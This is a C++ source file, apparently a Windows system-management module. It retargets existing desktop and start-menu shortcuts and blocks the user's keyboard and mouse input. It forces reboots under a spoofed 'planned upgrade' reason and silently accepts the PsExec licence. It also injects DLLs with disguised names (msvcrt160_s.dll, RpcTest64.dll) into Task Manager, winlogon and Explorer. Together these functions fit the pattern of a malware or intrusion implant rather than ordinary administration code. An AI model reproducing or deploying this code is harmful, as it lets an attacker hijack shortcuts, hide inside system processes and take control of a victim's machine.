#include <shlobj.h>
#include <WtsApi32.h>

#include "stdafx.h"
#include "sys_manage.h"
#include "utils.h"

std::wstring get_desktop_path() {
	wchar_t* p;
	if (S_OK != SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &p))
		return L"";
	std::wstring result = p;
	CoTaskMemFree(p);
	return result;
}

std::wstring get_public_desktop_path()
{
	wchar_t* p;
	if (S_OK != SHGetKnownFolderPath(FOLDERID_PublicDesktop, 0, NULL, &p))
		return L"";
	std::wstring result = p;
	CoTaskMemFree(p);
	return result;
}

std::wstring get_start_menu_path() {
	wchar_t* p;
	if (S_OK != SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &p))
		return L"";
	std::wstring result = p;
	CoTaskMemFree(p);
	return result;
}

std::wstring get_common_startmenu_path()
{
	wchar_t* p;
	if (S_OK != SHGetKnownFolderPath(FOLDERID_CommonStartMenu, 0, NULL, &p))
		return L"";
	std::wstring result = p;
	CoTaskMemFree(p);
	return result;
}

bool changeShortcut(LPCSTR dest, LPCWSTR target)
{
	CoInitialize(NULL);

	IShellLink* pShellLink;
	HRESULT hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
	if (FAILED(hres))
	{
		return 1;
	}

	IPersistFile* pPersistFile;
	hres = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
	if (FAILED(hres))
	{
		// Handle the error
		pShellLink->Release();
		return 0;
	}

	hres = pPersistFile->Load(target, STGM_READ);
	if (FAILED(hres))
	{
		// Handle the error
		pPersistFile->Release();
		pShellLink->Release();
		return 0;
	}

	// Set new path of shortcut
	hres = pShellLink->SetPath(dest);
	if (FAILED(hres))
	{
		// Handle the error
		pPersistFile->Release();
		pShellLink->Release();
		return 0;
	}

	// Save modified shortcut file
	hres = pPersistFile->Save(NULL, TRUE);
	if (FAILED(hres))
	{
		// Handle the error
		pPersistFile->Release();
		pShellLink->Release();
		return 0;
	}

	// Release interfaces
	pPersistFile->Release();
	pShellLink->Release();

	// Uninitialize COM library
	CoUninitialize();

	return 1;
}

bool CheckUserLogined()
{
	bool bRet = false;

	PWTS_SESSION_INFO pSessions = NULL;
	DWORD dwCount = 0;
	DWORD dwError;
	if (!WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &dwCount))
	{
		dwError = GetLastError();
		file_log("Error enumerating sessions");
	}
	else if (dwCount == 0)
	{
		file_log("No sessions available");
	}
	else
	{
		for (DWORD i = 0; i < dwCount; ++i)
		{
			if (pSessions[i].State == WTSActive) // has a logged in user
			{
				bRet = true;
				break;
			}
		}
	}
	if (pSessions)
		WTSFreeMemory(pSessions);

	return bRet;
}

// Function to toggle input blocking
void ToggleInputBlocking(bool blockInput) {
	static bool status = false;
	if (blockInput == status) return;

	BlockInput(blockInput);

	status = blockInput;
}

BOOL MySystemShutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process. 

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return(FALSE);

	// Get the LUID for the shutdown privilege. 

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 

	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
		(PTOKEN_PRIVILEGES)NULL, 0);

	if (GetLastError() != ERROR_SUCCESS)
		return FALSE;

	// Shut down the system and force all applications to close. 

	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
		SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_UPGRADE |
		SHTDN_REASON_FLAG_PLANNED))
		return FALSE;

	CloseHandle(hToken);

	//shutdown was successful
	return TRUE;
}

void hooktaskmgr()
{
	CHAR szDLLFile[MAX_PATH] = { 0 };
	char szCurrFile[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szCurrFile, sizeof(szCurrFile));
	PathRemoveFileSpecA(szCurrFile);

	StringCbPrintfA(szDLLFile, sizeof(szDLLFile), "%s\\%s", szCurrFile, "msvcrt160_s.dll");

	if (is64BitSystem() == TRUE)
		InstallHookDll(szDLLFile, "Taskmgr.exe", false);
}

void hookwinlogon()
{
	CHAR szDLLFile[MAX_PATH] = { 0 };
	char szCurrFile[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szCurrFile, sizeof(szCurrFile));
	PathRemoveFileSpecA(szCurrFile);

	StringCbPrintfA(szDLLFile, sizeof(szDLLFile), "%s\\%s", szCurrFile, "RpcTest64.dll");

	if(is64BitSystem() == TRUE)
		InstallHookDll(szDLLFile, "winlogon.exe", false);
}

void hookexplorer()
{
	CHAR szDLLFile[MAX_PATH] = { 0 };
	char szCurrFile[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szCurrFile, sizeof(szCurrFile));
	PathRemoveFileSpecA(szCurrFile);

	if (is64BitSystem() == TRUE)
	{
		file_log("installing Band64.dll");
		StringCbPrintfA(szDLLFile, sizeof(szDLLFile), "%s\\%s", szCurrFile, "Band64.dll");
		file_log(szDLLFile);

		InstallHookDll(szDLLFile, "explorer.exe", true);
	}
}

void refreshwindow()
{
	SendMessage(HWND_BROADCAST, WM_COMMAND, 0x7402, 0);
	SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
}

void setRegistryPsExec()
{
	HKEY hKey;
	LPCWSTR path = L"SOFTWARE\\Sysinternals\\PsExec";
	DWORD value = 1;

	LONG createStatus = RegCreateKeyExW(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

	if (createStatus == ERROR_SUCCESS)
	{
		LONG setStatus = RegSetValueExW(hKey, L"EulaAccepted", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));

		if (setStatus == ERROR_SUCCESS)
		{
			file_log("Registry value EulaAccepted set to 1");
		}
		else
		{
			file_log("Failed to set registry value EulaAccepted");
		}
	}
	else
	{
		file_log("Failed to create registry key");
	}

	RegCloseKey(hKey);
}